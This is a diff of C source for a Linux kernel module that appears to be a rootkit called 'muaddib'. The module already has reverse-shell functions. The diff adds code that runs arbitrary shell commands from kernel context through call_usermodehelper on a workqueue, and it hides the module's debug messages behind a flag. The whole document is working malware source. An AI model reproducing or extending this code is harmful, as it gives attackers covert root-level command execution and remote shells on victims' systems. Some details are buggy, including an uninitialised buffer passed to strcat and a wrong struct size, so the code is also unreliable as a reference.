@@ -21,6 +21,11 @@ struct shell_params {
 	char* target_port;
 };
 
+struct command_params {
+    struct work_struct work;
+    char* command;
+};
+
 void execute_reverse_shell(struct work_struct *work){
     int err;
     struct shell_params *params = (struct shell_params*)work;
@@ -48,17 +53,45 @@ void execute_reverse_shell(struct work_struct *work){
 
 }
 
-void execute_command(char* command){
+void execute_command(struct work_struct *work){
     int err;
-    char *envp[] = {HOME, TERM, NULL};
+    struct command_params *params = (struct command_params*)work;
+    char *envp[] = {HOME, TERM, params->command, NULL};
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     char *argv[] = {SHELL, "-c", exec, NULL};
-    strcat(exec, command);
+    strcat(exec, params->command);
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if(err<0){
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: Error executing usermodehelper.\n");
+        #endif
     }
     kfree(exec);
+    kfree(params->command);
+    kfree(params);
+}
+
+int start_command_execute(char* command){
+    int err;
+    struct command_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
+    if(!params){
+        #if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: Error allocating memory\n");
+		#endif
+        return 1;
+    }
+    params->command = kstrdup(command, GFP_KERNEL);
+    INIT_WORK(&params->work, &execute_command);
+
+    err = schedule_work(&params->work);
+    if(err<0){
+		#if DEBUGMSG == 1
+        printk(KERN_INFO "muaddib: Error scheduling work of executing command\n");
+		#endif
+    }
+    return err;
+
+
 }
 
 int start_reverse_shell(char* ip, char* port){
